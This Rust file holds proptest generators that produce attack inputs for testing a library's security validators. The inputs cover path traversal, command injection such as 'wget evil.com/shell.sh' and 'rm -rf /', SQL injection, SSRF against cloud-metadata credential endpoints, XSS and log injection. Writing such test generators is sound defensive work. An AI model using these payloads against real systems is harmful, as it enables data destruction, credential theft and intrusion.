//! Attack Pattern Generators
//!
//! Generators for common attack patterns used in property-based testing.
//! These patterns match what rust-core's security functions defend against.

use proptest::prelude::*;

// ============================================================================
// Path Traversal Attacks
// ============================================================================

/// Generate path traversal attack patterns
///
/// Produces strings like:
/// - `../etc/passwd`
/// - `..\..\windows\system32`
/// - `....//....//etc`
/// - URL-encoded variants
///
/// # Example
///
/// ```rust,ignore
/// proptest! {
///     #[test]
///     fn rejects_traversal(attack in arb_path_traversal()) {
///         assert!(validate_path(&attack).is_err());
///     }
/// }
/// ```
pub fn arb_path_traversal() -> impl Strategy<Value = String> {
    prop_oneof![
        // Basic traversal
        Just("../etc/passwd".to_string()),
        Just("..\\..\\windows\\system32".to_string()),
        Just("../../../../../../etc/passwd".to_string()),
        // Double-encoded
        Just("%2e%2e%2f%2e%2e%2fetc/passwd".to_string()),
        Just("%252e%252e%252f".to_string()),
        // Mixed separators
        Just("..\\../..\\../etc".to_string()),
        Just("../..\\../..\\".to_string()),
        // Null byte injection
        Just("../etc/passwd\0.txt".to_string()),
        // Unicode tricks
        Just("..%c0%af..%c0%af".to_string()),
        // With prefix that might bypass validation
        Just("/safe/../../../etc/passwd".to_string()),
        Just("./valid/../../etc/passwd".to_string()),
        // Repeated dots
        Just("....//....//etc/passwd".to_string()),
        // Generated patterns
        (1..10usize).prop_map(|n| "../".repeat(n) + "etc/passwd"),
        (1..10usize).prop_map(|n| "..\\".repeat(n) + "windows\\system32"),
    ]
}

// ============================================================================
// Command Injection Attacks
// ============================================================================

/// Generate command injection attack patterns
///
/// Produces strings with shell metacharacters and command substitution.
///
/// # Example
///
/// ```rust,ignore
/// proptest! {
///     #[test]
///     fn rejects_injection(attack in arb_command_injection()) {
///         assert!(sanitize_command(&attack).is_err());
///     }
/// }
/// ```
pub fn arb_command_injection() -> impl Strategy<Value = String> {
    prop_oneof![
        // Command substitution
        Just("$(whoami)".to_string()),
        Just("`id`".to_string()),
        Just("${PATH}".to_string()),
        Just("$(cat /etc/passwd)".to_string()),
        // Shell metacharacters
        Just("; rm -rf /".to_string()),
        Just("| cat /etc/passwd".to_string()),
        Just("& echo pwned".to_string()),
        Just("&& wget evil.com/shell.sh".to_string()),
        Just("|| true".to_string()),
        // Embedded in paths
        Just("/tmp/$(whoami)/file".to_string()),
        Just("/var/log/`date`.log".to_string()),
        Just("file; rm -rf /".to_string()),
        // Newline injection
        Just("file\nrm -rf /".to_string()),
        Just("file\r\necho pwned".to_string()),
        // Variable expansion
        Just("$HOME/.config".to_string()),
        Just("${HOME}/.ssh".to_string()),
        Just("$USER".to_string()),
        // Quotes and escapes
        Just("'; DROP TABLE users; --".to_string()),
        Just("\" && cat /etc/passwd".to_string()),
        // Combined attacks
        Just("../$(whoami)/../../etc/passwd".to_string()),
    ]
}

// ============================================================================
// SQL Injection Attacks
// ============================================================================

/// Generate SQL injection attack patterns
///
/// # Example
///
/// ```rust,ignore
/// proptest! {
///     #[test]
///     fn rejects_sqli(attack in arb_sql_injection()) {
///         assert!(validate_identifier(&attack).is_err());
///     }
/// }
/// ```
pub fn arb_sql_injection() -> impl Strategy<Value = String> {
    prop_oneof![
        // Classic injection
        Just("' OR '1'='1".to_string()),
        Just("'; DROP TABLE users; --".to_string()),
        Just("1; DELETE FROM users".to_string()),
        // UNION attacks
        Just("' UNION SELECT * FROM users --".to_string()),
        Just("1 UNION ALL SELECT NULL,NULL,NULL".to_string()),
        // Comment-based
        Just("admin'--".to_string()),
        Just("admin'/*".to_string()),
        // Stacked queries
        Just("1; INSERT INTO admin VALUES('hacker')".to_string()),
        // Blind injection
        Just("' AND 1=1 --".to_string()),
        Just("' AND SLEEP(5) --".to_string()),
        // Time-based
        Just("'; WAITFOR DELAY '0:0:5' --".to_string()),
        // Reserved keywords as identifiers
        Just("SELECT".to_string()),
        Just("DROP".to_string()),
        Just("DELETE".to_string()),
        Just("INSERT".to_string()),
        Just("UPDATE".to_string()),
    ]
}

// ============================================================================
// SSRF Attacks
// ============================================================================

/// Generate SSRF attack URLs
///
/// Produces URLs targeting internal resources, cloud metadata, etc.
///
/// # Example
///
/// ```rust,ignore
/// proptest! {
///     #[test]
///     fn blocks_ssrf(url in arb_ssrf_url()) {
///         assert!(!is_ssrf_safe(&url));
///     }
/// }
/// ```
pub fn arb_ssrf_url() -> impl Strategy<Value = String> {
    prop_oneof![
        // Cloud metadata endpoints
        Just("http://169.254.169.254/latest/meta-data/".to_string()),
        Just("http://169.254.170.2/v2/credentials".to_string()),
        Just("http://metadata.google.internal/computeMetadata/v1/".to_string()),
        // Localhost variants
        Just("http://localhost/admin".to_string()),
        Just("http://127.0.0.1/".to_string()),
        Just("http://[::1]/".to_string()),
        Just("http://0.0.0.0/".to_string()),
        // Internal networks
        Just("http://192.168.1.1/".to_string()),
        Just("http://10.0.0.1/".to_string()),
        Just("http://172.16.0.1/".to_string()),
        // Internal hostnames
        Just("http://internal.corp/".to_string()),
        Just("http://db.local/".to_string()),
        Just("http://kubernetes.default.svc/".to_string()),
        // Dangerous schemes
        Just("file:///etc/passwd".to_string()),
        Just("gopher://localhost:25/".to_string()),
        Just("dict://localhost:11211/".to_string()),
        // URL shorteners (redirect attacks)
        Just("http://bit.ly/malicious".to_string()),
        Just("http://tinyurl.com/internal".to_string()),
        // DNS rebinding
        Just("http://127.0.0.1.xip.io/".to_string()),
        // IPv6 localhost
        Just("http://[0:0:0:0:0:0:0:1]/".to_string()),
    ]
}

// ============================================================================
// XSS Attacks
// ============================================================================

/// Generate XSS attack patterns
///
/// Produces strings with JavaScript injection attempts.
pub fn arb_xss() -> impl Strategy<Value = String> {
    prop_oneof![
        // Script tags
        Just("<script>alert('XSS')</script>".to_string()),
        Just("<SCRIPT>alert('XSS')</SCRIPT>".to_string()),
        Just("<script src='evil.js'></script>".to_string()),
        // Event handlers
        Just("<img onerror='alert(1)' src='x'>".to_string()),
        Just("<body onload='alert(1)'>".to_string()),
        Just("<div onmouseover='alert(1)'>".to_string()),
        // JavaScript URLs
        Just("javascript:alert('XSS')".to_string()),
        Just("javascript:alert(document.cookie)".to_string()),
        // Data URLs
        Just("data:text/html,<script>alert(1)</script>".to_string()),
        // Encoded
        Just("%3Cscript%3Ealert(1)%3C/script%3E".to_string()),
        Just("&#60;script&#62;alert(1)&#60;/script&#62;".to_string()),
        // SVG
        Just("<svg onload='alert(1)'>".to_string()),
        // Template injection
        Just("{{constructor.constructor('alert(1)')()}}".to_string()),
    ]
}

// ============================================================================
// Log Injection Attacks
// ============================================================================

/// Generate log injection attack patterns
///
/// Produces strings that could forge log entries or inject control characters.
pub fn arb_log_injection() -> impl Strategy<Value = String> {
    prop_oneof![
        // Newline injection (fake log entries)
        Just("user\n[ERROR] Fake error".to_string()),
        Just("action\r\n[CRITICAL] Injected".to_string()),
        // ANSI escape sequences
        Just("\x1B[31mRED\x1B[0m".to_string()),
        Just("\x1B[2J\x1B[H".to_string()),    // Clear screen
        Just("\x1B]0;pwned\x07".to_string()), // Set terminal title
        // Control characters
        Just("text\x00hidden".to_string()),   // Null byte
        Just("text\x08\x08\x08".to_string()), // Backspace
        Just("text\x7F".to_string()),         // DEL
        // Tab injection (format manipulation)
        Just("user\tadmin\ttrue".to_string()),
        // Carriage return (overwrite)
        Just("Failed login\rSuccessful login".to_string()),
        // Unicode direction override
        Just("user\u{202E}admin".to_string()),
    ]
}

#[cfg(test)]
mod tests {
    #![allow(clippy::panic, clippy::expect_used)]
    use super::*;
    use proptest::strategy::ValueTree;
    use proptest::test_runner::TestRunner;

    #[test]
    fn test_traversal_generator_produces_values() {
        let mut runner = TestRunner::default();
        let strategy = arb_path_traversal();

        for _ in 0..10 {
            let value = strategy
                .new_tree(&mut runner)
                .expect("Failed to create value tree")
                .current();
            // All traversal patterns should contain dots or percent-encoded variants
            // This includes: .., ..../, %2e, %252e, %c0%af, etc.
            let has_traversal =
                value.contains('.') || value.to_lowercase().contains("%2") || value.contains("%c");
            assert!(has_traversal, "Should contain traversal pattern: {}", value);
        }
    }

    #[test]
    fn test_injection_generator_produces_values() {
        let mut runner = TestRunner::default();
        let strategy = arb_command_injection();

        for _ in 0..10 {
            let value = strategy
                .new_tree(&mut runner)
                .expect("Failed to create value tree")
                .current();
            let has_injection = value.contains("$(")
                || value.contains('`')
                || value.contains(';')
                || value.contains('|')
                || value.contains('&')
                || value.contains('$')
                || value.contains('\n');
            assert!(has_injection, "Should contain injection pattern: {}", value);
        }
    }

    #[test]
    fn test_ssrf_generator_produces_values() {
        let mut runner = TestRunner::default();
        let strategy = arb_ssrf_url();

        for _ in 0..10 {
            let value = strategy
                .new_tree(&mut runner)
                .expect("Failed to create value tree")
                .current();
            // All SSRF patterns are URL-like with a scheme
            assert!(
                value.contains("://"),
                "Should be a URL with scheme: {}",
                value
            );
        }
    }
}
